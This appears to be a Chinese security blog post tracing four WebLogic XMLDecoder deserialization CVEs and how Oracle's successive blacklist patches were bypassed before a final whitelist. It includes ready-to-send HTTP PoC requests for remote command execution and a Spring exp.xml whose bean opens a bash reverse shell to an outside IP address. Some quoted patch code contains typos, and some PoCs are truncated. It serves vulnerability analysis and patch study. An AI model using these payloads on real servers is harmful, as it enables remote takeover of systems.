# 黑名单不靠谱--WebLogic XMLDecoder漏洞修补历史

CVE-2017-3506、CVE-2017-10271、CVE-2019-2725、CVE-2019-2729四个漏洞是位于同一个调用链中，但是前前后后修补了四次，前三次都是通过黑名单过滤试图解决问题，结果事与愿违，接二连三地继续爆出漏洞。下面通过POC和修补方案简单分析一下这四个漏洞的关系。

这几个洞涉及两个包可以触发。一个是wls-wsat.war，另一个是wls9_async_response.war，两个包中的多个servlet最终调用WorkContextXmlInputAdapter方法以及XmlDeoder触发漏洞，url-pattern如下。

wls-wsat

```
/CoordinatorPortType
/RegistrationPortTypeRPC
/ParticipantPortType
/RegistrationRequesterPortType
/CoordinatorPortType11
/RegistrationPortTypeRPC11
/ParticipantPortType11
/RegistrationRequesterPortType11
```
wls9_async_response，这里面的Soap12没成功，提示namespace问题，可能需要改造poc，挖个坑。
```
/AsyncResponseServiceHttps
/AsyncResponseServiceJms
/AsyncResponseService
/AsyncResponseServiceSoap12Jms
/AsyncResponseServiceSoap12
/AsyncResponseServiceSoap12Https
```

后面重点会放在黑名单和补丁的对比，漏洞具体原理会简单提一下。

## CVE-2017-3506

首先是CVE-2017-3506的poc，最原始使用object标签指定class，使用void标签指定要调用的method达到命令执行的效果。

### POC

这是当时广泛流传的POC。

``` xml
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: localhost:7001
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: remember-me=MXPUSANQRVaBJYtUucUgmQ==
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: text/xml
Content-Length: 495

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">  
  <soapenv:Header> 
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">  
<java>
	<object class="java.lang.ProcessBuilder">
		<array class="java.lang.String" length="1" >
			<void index="0"> 
				<string>calc</string>			
			</void>		
		</array>
		<void method="start"/>
	</object>
</java>
    </work:WorkContext> 
  </soapenv:Header>  
  <soapenv:Body/> 
</soapenv:Envelope>
```

为了证实两个包都属于有同一调用链触发，也可以尝试一下下面的POC，核心的内容完全相同。

``` xml
POST /_async/AsyncResponseService HTTP/1.1
Host: localhost:7001
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: remember-me=MXPUSANQRVaBJYtUucUgmQ==
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: text/xml
Content-Length: 722

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">
   <soapenv:Header> 
	   <wsa:Action>xx</wsa:Action>
	   <wsa:RelatesTo>xx</wsa:RelatesTo>
	   <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
		    <java>
                <object class="java.lang.ProcessBuilder">
		            <array class="java.lang.String" length="1" >
			            <void index="0"> 
				            <string>calc</string>			
			            </void>		
		            </array>
		                <void method="start"/>
	            </object>
			</java>
		</work:WorkContext>   
	</soapenv:Header>   
	<soapenv:Body>     
	<asy:onAsyncDelivery/>   
	</soapenv:Body>
</soapenv:Envelope>
```

### 第一次黑名单补丁

补丁简单地排除掉了object标签，这就有了后来的CVE-2018-10271。

``` java
private void validate(InputStream is) {
      WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();
      try {
         SAXParser parser = factory.newSAXParser();
         parser.parse(is, new DefaultHandler() {
            public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException {
               if(qName.equalsIgnoreCase("object")) {
                  throw new IllegalStateException("Invalid context type: object");
               }
            }
         });
      } catch (ParserConfigurationException var5) {
         throw new IllegalStateException("Parser Exception", var5);
      } catch (SAXException var6) {
         throw new IllegalStateException("Parser Exception", var6);
      } catch (IOException var7) {
         throw new IllegalStateException("Parser Exception", var7);
      }
   }
```

## CVE-2017-10271

在整个漏洞利用过程中XMLDecoder中涉及到一个DocumentHandler类非常重要，DocumentHandler中的ElementHandler中处理的XML标签有下面这些。

``` java
    public DocumentHandler() {
        this.setElementHandler("java", JavaElementHandler.class);
        this.setElementHandler("null", NullElementHandler.class);
        this.setElementHandler("array", ArrayElementHandler.class);
        this.setElementHandler("class", ClassElementHandler.class);
        this.setElementHandler("string", StringElementHandler.class);
        this.setElementHandler("object", ObjectElementHandler.class);
        this.setElementHandler("void", VoidElementHandler.class);
        this.setElementHandler("char", CharElementHandler.class);
        this.setElementHandler("byte", ByteElementHandler.class);
        this.setElementHandler("short", ShortElementHandler.class);
        this.setElementHandler("int", IntElementHandler.class);
        this.setElementHandler("long", LongElementHandler.class);
        this.setElementHandler("float", FloatElementHandler.class);
        this.setElementHandler("double", DoubleElementHandler.class);
        this.setElementHandler("boolean", BooleanElementHandler.class);
        this.setElementHandler("new", NewElementHandler.class);
        this.setElementHandler("var", VarElementHandler.class);
        this.setElementHandler("true", TrueElementHandler.class);
        this.setElementHandler("false", FalseElementHandler.class);
        this.setElementHandler("field", FieldElementHandler.class);
        this.setElementHandler("method", MethodElementHandler.class);
        this.setElementHandler("property", PropertyElementHandler.class);
    }
```

CVE-2017-3506需要用到的是object标签，那么10271是怎么绕过的呢，我们先比较一下POC。

区别就是原来object标签替换成了void标签。

``` xml
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: localhost:7001
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: remember-me=MXPUSANQRVaBJYtUucUgmQ==
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: text/xml
Content-Length: 708

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">  
  <soapenv:Header> 
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">  
    <java>
        <void class="java.lang.ProcessBuilder">
            <array class="java.lang.String" length="1">
                <void index="0">
                	<string>calc</string>
                </void>
            </array>
        <void method="start"/></void>
    </java>
    </work:WorkContext> 
  </soapenv:Header>  
  <soapenv:Body/> 
</soapenv:Envelope>
```

同时也出现了用new和method标签的利用。

``` xml
<java version="1.4.0" class="java.beans.XMLDecoder">
    <new class="java.lang.ProcessBuilder">
        <string>calc</string>
        <method name="start" />
    </new>
</java>
```

为什么仅仅替换一下void标签就可以了呢？因为VoidElementHandler继承自ObjectElementHandler！不可以使用object指定class，可以用void标签指定class。

``` java
final class VoidElementHandler extends ObjectElementHandler {
    VoidElementHandler() {
    }

    protected boolean isArgument() {
        return false;
    }
}
```

### 第二次黑名单补丁

显然这次的黑名单修补非常地不成功，Oracle痛定思痛，决定大刀阔斧再来一大波黑名单，CVE-2017-10271的补丁又一次更新了validate。object、new、method、void都上了黑名单，array标签后面只允许跟byte类型。
``` java
private void validate(InputStream is) {
   WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();
   try {
      SAXParser parser = factory.newSAXParser();
      parser.parse(is, new DefaultHandler() {
         private int overallarraylength = 0;
         public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException {
            if(qName.equalsIgnoreCase("object")) {
               throw new IllegalStateException("Invalid element qName:object");
            } else if(qName.equalsIgnoreCase("new")) {
               throw new IllegalStateException("Invalid element qName:new");
            } else if(qName.equalsIgnoreCase("method")) {
               throw new IllegalStateException("Invalid element qName:method");
            } else {
               if(qName.equalsIgnoreCase("void")) {
                  for(int attClass = 0; attClass < attributes.getLength(); ++attClass) {
                     if(!"index".equalsIgnoreCase(attributes.getQName(attClass))) {
                        throw new IllegalStateException("Invalid attribute for element void:" + attributes.getQName(attClass));
                     }
                  }
               }
               if(qName.equalsIgnoreCase("array")) {
                  String var9 = attributes.getValue("class");
                  if(var9 != null && !var9.equalsIgnoreCase("byte")) {
                     throw new IllegalStateException("The value of class attribute is not valid for array element.");
                  }
```

这里看似不能再使用void，其实不然，代码经过了一顿操作，如果void标签的内容是空或者只带index就不会抛出异常，由此又引出了新的漏洞。

## CVE-2019-2725

整理一下思路，我们想要利用XMLDecoder执行命令首先需要指定类名，指定类名之后要指定方法名，指定方法名之后需要指定参数完成RCE。

那么我们那现在还能用什么呢？首先class标签`<class>`可以和object标签`<object class>`达到一样的效果，[详细可以参考dtd文档]。(https://www.oracle.com/technetwork/java/persistence3-139471.html)没有method标签指定调用的方法，我们可以寻找有利用价值的构造方法，在实例化的同时直接调用。

下一步是解决参数问题，上面已经说了void标签只接index属性或者空，array中class属性只能是空或者byte类型。

那么总结下来，我们需要找到一个构造方法，构造方法的参数类型是byte_array或者是基础数据类型，比如string，int就可以满足array元素和void元素的限制条件。

师傅们找到了几个可以使用的构造方法，比如利用spring
依赖注入的`com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext`，利用二次反序列化的`oracle.toplink.internal.sessions.UnitOfWorkChangeSet`。



### POC

这是利用FileSystemXmlApplicationContext的POC。

``` xml
POST /_async/AsyncResponseService HTTP/1.1
Host: localhost:7001
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: text/xml
Content-Length: 
Cookie: remember-me=MXPUSANQRVaBJYtUucUgmQ==
Connection: close
Upgrade-Insecure-Requests: 1

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">
   <soapenv:Header> 
	   <wsa:Action>xx</wsa:Action>
	   <wsa:RelatesTo>xx</wsa:RelatesTo>
	   <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
		   <java>
				<class>					<string>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</string>
					<void>
						<string>http://xxxx</string>
					</void>
				</class>
			</java>
		</work:WorkContext>   
	</soapenv:Header>   
	<soapenv:Body>     
	<asy:onAsyncDelivery/>   
	</soapenv:Body>
</soapenv:Envelope>
```

exp.xml

``` xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://www.springframework.org/schema/beans">
<bean init-method="start" class="java.lang.ProcessBuilder" id="pb">
    <constructor-arg>
        <list>
            <value>bash</value>
            <value>-c</value>
            <value>bash -i >& /dev/tcp/114.116.24.42/8999 0>&1</value>
        </list>
    </constructor-arg>
</bean>
</beans>
```

还有利用UnitOfWorkChangeSet的POC。

``` xml
POST /_async/AsyncResponseService HTTP/1.1
Host: localhost:7001
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: text/xml
Content-Length: 
Cookie: remember-me=MXPUSANQRVaBJYtUucUgmQ==
Connection: close
Upgrade-Insecure-Requests: 1

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressi
ng" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   <soapenv:Header>
<wsa:Action>xx</wsa:Action>
<wsa:Relates
To>xx</wsa:RelatesTo> <
work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java>
<class><string>oracle.toplink.internal.sessions.UnitOfWorkChangeSet</string>
<void>
<array class="byte" length="2946">
<void index="0"><byte>-84</byte></void>
<void index="1"><byte>-19</byte></void>
<void index="2"><byte>0</byte></void>
<void index="3"><byte>5</byte></void>
    .....
</array>
</void>
</class>
</java>
</work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>
```

### 第三次黑名单补丁

这一次Oracle不知悔改又在validate黑名单中加了对class标签的过滤，妄想通过禁止指定类名来解决问题，然而事情并没有因此结束。

``` java
private void validate(InputStream is) {
   WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();
   try {
      SAXParser parser = factory.newSAXParser();
      parser.parse(is, new DefaultHandler() {
         private int overallarraylength = 0;
         public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException {
            if (qName.equalsIgnoreCase("object")) {
               throw new IllegalStateException("Invalid element qName:object");
            } else if (qName.equalsIgnoreCase("class")) {
               throw new IllegalStateException("Invalid element qName:class");
            } else if (qName.equalsIgnoreCase("new")) {
               throw new IllegalStateException("Invalid element qName:new");
            } else if (qName.equalsIgnoreCase("method")) {
               throw new IllegalStateException("Invalid element qName:method");
            } else {
               if (qName.equalsIgnoreCase("void")) {
                  for(int i = 0; i < attributes.getLength(); ++i) {
                     if (!"index".equalsIgnoreCase(attributes.getQName(i))) {
                        throw new IllegalStateException("Invalid attribute for element void:" + attributes.getQName(i));
                     }
                  }
               }
               if (qName.equalsIgnoreCase("array")) {
                  String attClass = attributes.getValue("class");
                  if (attClass != null && !attClass.equalsIgnoreCase("byte")) {
                     throw new IllegalStateException("The value of class attribute is not valid for array element.");
                  }
                  String lengthString = attributes.getValue("length");
                  if (lengthString != null) {
                     try {
                        int length = Integer.valueOf(lengthString);
                        if (length >= WorkContextXmlInputAdapter.MAXARRAYLENGTH) {
                           throw new IllegalStateException("Exceed array length limitation");
                        }
                        this.overallarraylength += length;
                        if (this.overallarraylength >= WorkContextXmlInputAdapter.OVERALLMAXARRAYLENGTH) {
                           throw new IllegalStateException("Exceed over all array limitation.");
                        }
                     } 
```

## CVE-2019-2729

上一个漏洞没爆出几天，就又来了个绕过2725的POC，这次的POC尽限于jdk1.6，但是用jdk1.6的WebLogic 10并不是少数（weblogic10默认带的是1.6而且1.8以上就不兼容了）。

jdk1.7中array标签只能接length，class，id中的一个属性。ArrayElementHandler继承自NewElementHandler，NewElementHandler继承自ElementHandler，分别可以处理length，class，id)，这里就不一一粘贴代码了。

然而jdk1.6中不同，1.6中的xml解析并不像1.7中一样严谨，ObjectHandler(1.6中的DocumentHandler类)会给所有属性做一个统一的处理，这里面一些代码逻辑问题导致了array标签可以指定方法名(细节待补充)，因此可以通过Class.forName来指定类，绕过上一个补丁对class的过滤。


### POC

使用`<array method =“forName”>`替换class标签。

``` xml
POST /_async/AsyncResponseService HTTP/1.1
Host: localhost:7001
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: text/xml
Content-Length: 
Cookie: remember-me=MXPUSANQRVaBJYtUucUgmQ==
Connection: close
Upgrade-Insecure-Requests: 1

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressi
ng" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   <soapenv:Header>
<wsa:Action>xx</wsa:Action>
<wsa:Relates
To>xx</wsa:RelatesTo> <
work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java>
<array method="froName"><string>oracle.toplink.internal.sessions.UnitOfWorkChangeSet</string>
<void>
<array class="byte" length="2946">
<void index="0"><byte>-84</byte></void>
<void index="1"><byte>-19</byte></void>
<void index="2"><byte>0</byte></void>
<void index="3"><byte>5</byte></void>
    .....
</array>
</void>
</array>
</java>
</work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>
```

### 第四次白名单补丁

这次Oracle终于使用了白名单过滤，array标签只能允许带有byte的class属性，或者带有length属性的任意属性。

``` java
public class WorkContextFormatInfo{
    public static final Map<String, Map<String, String>> allowedName = new HashMap();

    static{
        allowedName.put("string", null);
        allowedName.put("int", null);

        allowedName.put("long", null);

        Map<String, String> allowedAttr = new HashMap();
        allowedAttr.put("class", "byte");
        allowedAttr.put("length","any");

        allowedNmae.put("array", allowedAttr);

        allowedAttr = new HashMap();

        allowedAttr.put("inedx", "any");
        allowedAttr.put("void", allowedAttr);

        allowedAttr.put("byte", null);
        allowedAttr.put("boolean", null);
        allowedAttr.put("short", null);
        allowedAttr.put("char", null);
        allowedAttr.put("float", null);
        allowedAttr.put("double", null);

        allowedAttr = new HashMap();
        allowedAttr.put("class", "java.beans.XMLDecoder");
        allowedAttr.put("version", "any");

        allowedName.put("java",allowedAttr);

    }
}
```

## 总结

从上面的总结可以看到，虽然不能说白名单百分百可行，但黑名单始终是不靠谱的。从绕过object黑名单使用void指定class，到绕过void黑名单使用class指定类调用构造函数，再到使用array标签绕过class黑名单用forName方法指定类名，真可谓是魔高一尺道高一丈啊。